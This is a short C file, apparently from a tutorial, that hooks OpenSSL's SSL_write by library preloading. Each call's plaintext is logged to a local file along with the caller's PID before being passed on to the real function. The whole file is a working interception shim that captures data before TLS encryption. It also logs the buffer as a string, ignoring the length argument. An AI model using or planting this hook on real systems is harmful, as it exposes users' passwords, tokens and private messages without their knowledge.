#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <openssl/ssl.h>

/* Define our sooper-evil wrapper function!
 *
 * As we can see, our function definition needs to return an integer and
 * take three arguments: a pointer to an SSL context, a pointer to a 
 * buffer containing the string to encrypt, and the number of bytes to 
 * write. In addition to our intercepting function definition we define 
 * a matching function pointer that will point to the originally 
 * intended SSL_write function and initialize it with the dlsym 
 * function. After pointing our pointer to the original function, we log 
 * the pid of the process calling SSL_write, and the string sent to it. 
 */
int SSL_write(SSL *context, const void *buffer, int bytes) 
{
    /* Declare the pointer function */
    int (*real_ssl_write)(SSL *context, const void *buffer, int bytes);

    /* Define the wrapper function */
    real_ssl_write = dlsym(RTLD_NEXT, "SSL_write");

    FILE *logfile = fopen("logfile", "a+");
    fprintf(logfile, "Process %d:\n\n%s\n\n\n", getpid(), (char*)buffer);
    fclose(logfile);

    return real_ssl_write(context, buffer, bytes);
}
